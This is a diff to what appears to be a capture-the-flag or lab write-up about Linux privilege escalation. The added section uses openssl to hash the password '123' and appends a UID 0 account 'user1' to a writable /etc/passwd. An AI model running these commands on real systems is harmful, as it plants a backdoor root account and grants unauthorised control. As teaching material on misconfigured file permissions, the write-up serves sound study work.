@@ -152,6 +152,20 @@ find / -writable -group brexit -type f 2>/dev/null
 /etc/passwd
 ```
 
+as you can see, we have write permission on `/etc/passwd`, so we can add a new user with root privileges:
+
+use `openssl` to generate hash for password `123`:
+
+```bash
+root@kali: openssl passwd 123
+$1$omSAxpxQ$d102EUA0tdSWmNydywbng.
+```
+
+then give that password for new user `user1`
+
+```bash
+echo 'user1:$1$omSAxpxQ$d102EUA0tdSWmNydywbng.:0:0:root:/root:/bin/bash' >> /etc/passwd
+```
 
 
 
